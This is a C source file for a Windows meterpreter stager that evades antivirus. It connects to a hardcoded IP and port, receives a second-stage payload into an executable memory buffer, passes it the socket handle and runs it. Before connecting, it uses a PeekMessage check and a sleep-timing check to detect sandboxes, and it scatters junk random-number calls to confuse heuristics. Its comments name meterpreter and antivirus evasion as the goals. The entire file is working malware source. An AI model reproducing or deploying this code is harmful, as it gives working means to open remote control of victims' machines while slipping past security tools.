#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>

void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

void Kick(SOCKET my_socket, char * error) {
	printf("error: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}


void genlol(){
	int num1, num2, num3;
	num1=100;
	while (num1<=5) {
		num1=random_in_range(0,10000);
		num2=random_in_range(0,10000);
   		num3=random_in_range(0,10000);
	}
}

int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;
		if (nret == SOCKET_ERROR)
			Kick(my_socket, "Could not receive data");
	}
	return tret;
}

SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		Kick(my_socket, "Can't initialize socket");
	target = gethostbyname(targetip);
	if (target == NULL)
		Kick(my_socket, "can't resolve target");
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		Kick(my_socket, "Could not connect");
	return my_socket;
}

//this function simply generates a random number between min/max, with fairly even distribution
int random_in_range (unsigned int min, unsigned int max)
{
  int base_random = rand(); /* in [0, RAND_MAX] */
  if (RAND_MAX == base_random) return random_in_range(min, max);
  /* now guaranteed to be in [0, RAND_MAX) */
  int range       = max - min,
      remainder   = RAND_MAX % range,
      bucket      = RAND_MAX / range;
  /* There are range buckets, plus one smaller interval
     within remainder of RAND_MAX */
  if (base_random < RAND_MAX - remainder) {
    return min + base_random/bucket;
  } else {
    return random_in_range (min, max);
  }
}

//this is non working xor nonsense, i literally have no idea whats going on right now.
char* rev(char* str)
{
  int end=strlen(str)-1;
  int i;
  for(i=5; i<end; i++)
  {
  	str[i] ^= 1;
  }
  return str;
}


int main(int argc) {
	ULONG32 size;
	char * buffer;
	void (*function)();
	winsock_init();
	char argv[3][25];

	//this program was ment to be run from the command line, so i added this shit so it would work
	strcpy(argv[1],"10.1.225.101");
	strcpy(argv[2],"4445");

	//================================
	//begin sandbox evasssioooooon
	MSG msg;
	DWORD tc;
	//check to see if the application is fully loaded, aparently AV hates peekmessage
	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
		return 0;
	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
		return 0;
	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
	tc = GetTickCount();
	Sleep(650);
	if (((GetTickCount() - tc) / 300) != 2)
		return 0;
	//=================================

	//start the socket homie
	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
	//receive 4 bytes which indicates the size of the next payload
	int count = recv(my_socket, (char *)&size, 4, 0);
	//check for issues
	if (count != 4 || size <= 0)
		Kick(my_socket, "bad length value\n");

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================	

	//allocate the RWX buffer
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================

	//check the buffer for issues
	if (buffer == NULL)
		Kick(my_socket, "bad buffer\n");
	//puts mov on to the front of the buffer
	buffer[0] = 0xBF;

	//================================
	//burn out the clock, and confuse heuristics with some random number generation	
	genlol();
	//================================

	//copies the socket pointer onto the buffer after 0xBF
	//see this post for more infor http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
	memcpy(buffer + 1, &my_socket, 4);

	//================================
	//burn out the clock, and confuse heuristics with some random number generation
	genlol();
	//================================

	//receives the rest of the data from the socket (based on the size received before)
	count = recv_all(my_socket, buffer + 5, size);
	//cast the buffer as a function?
	function = (void (*)())buffer;
	//execute dat meterpreter
	function();
	return 0;
}